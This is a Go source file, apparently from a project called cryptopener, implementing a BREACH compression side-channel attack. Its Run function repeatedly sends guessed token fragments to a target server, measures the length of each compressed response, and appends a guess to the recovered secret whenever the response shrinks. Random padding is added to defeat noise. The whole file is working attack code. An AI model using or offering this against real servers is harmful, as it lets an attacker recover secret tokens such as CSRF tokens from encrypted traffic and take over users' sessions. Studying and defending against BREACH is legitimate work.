package cryptopener

import (
	"log"
	"io/ioutil"
	"os"
	"math/rand"
	"time"

	client "github.com/larikuistio/cryptopener/client"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	TokenLength, correctCount int
	ResultToken []byte
	dummyChars []byte
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string, length int) *Cryptopener {
	rand.Seed(time.Now().Unix())
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
		TokenLength: length,
		ResultToken: []byte{},
		dummyChars: []byte("!#&%$*+-(){}"),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte) int64 {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	return size
}

func (p Cryptopener) createPadding() []byte {
	var ret []byte
	for i := 0; i < 8; i++ {
		ret = append(ret, p.dummyChars[rand.Intn(11)])
	}
	return ret
}

func Pow(x int, n int) int {
	var ret int
	if n == 0 {
		ret = 1
	} else {
		ret = x
		for i := 0; i < n - 1; i++ {
			ret = x * ret
		}
	}
	return ret
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	var checkBaseLength bool = true
	var baseLength int64
	var mutations int = 1

	var padding []byte
	for p.correctCount < p.TokenLength - 1 {
		// new payload
		payload := []byte{}
		y := Pow(p.mutator.tokenCount, mutations)

		if checkBaseLength {
			// create new payload
			for i := 0; i < mutations; i++ {
				payload = append(payload, p.dummyChars[rand.Intn(11)])
			}

			payload = append(p.ResultToken, payload...)
			log.Printf("Sending payload: %s", string(payload))
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(payload, padding)
			baseLength = p.analyseResponse(response)
			checkBaseLength = false
		} else {
			// create new payload
			mutpayload, _ := p.mutator.NewPayload(false)
			payload = append(p.ResultToken, mutpayload...)
			log.Printf("Sending payload: %s", string(payload))

			// send payload into a socket and then response into channel
			response := p.client.SendMessage(payload, padding)
			tempLength := p.analyseResponse(response)
			if tempLength < baseLength {
				p.ResultToken = append(p.ResultToken, mutpayload...)
				// reset mutator state
				p.mutator = NewMutator()
				checkBaseLength = true
				p.correctCount++
				mutations = 1
			} else if p.mutator.mutations - int64(y) == 0 {
				mutations++
				checkBaseLength = true
				if mutations % 2 == 0 {
					padding = append(padding, p.createPadding()...)
				}
			}
		}
	}
	log.Printf("The guessed token is %s", string(p.ResultToken))
}
